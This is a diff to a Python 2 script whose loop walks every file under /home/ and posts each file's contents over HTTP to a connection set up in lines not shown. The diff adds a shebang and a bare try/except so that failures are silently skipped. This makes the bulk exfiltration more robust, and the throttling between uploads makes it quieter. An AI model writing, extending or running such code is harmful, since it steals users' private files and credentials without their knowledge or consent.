@@ -1,3 +1,5 @@
+#!/usr/bin/env python2
+
 import httplib
 import os
 import time
@@ -20,16 +22,20 @@ def main():
     i = 0
     for subdir, dirs, files in os.walk('/home/'):
         for file_name in files:
-	    i += 1
-	    time.sleep(3)
-            file_path = subdir + os.sep + file_name
-	    handle = open(file_path)
-	    contents = handle.read()
-	    handle.close()
+	    try:
+	        i += 1
+	        time.sleep(3)
+                file_path = subdir + os.sep + file_name
+	        handle = open(file_path)
+	        contents = handle.read()
+	        handle.close()
 
-	    final_path = path + str(i)
-	    connection.request('POST', path, contents, headers)
-	    connection.getresponse().read()
+	        final_path = path + str(i)
+	        connection.request('POST', path, contents, headers)
+	        connection.getresponse().read()
+	    except:
+		pass
+
 
 
 
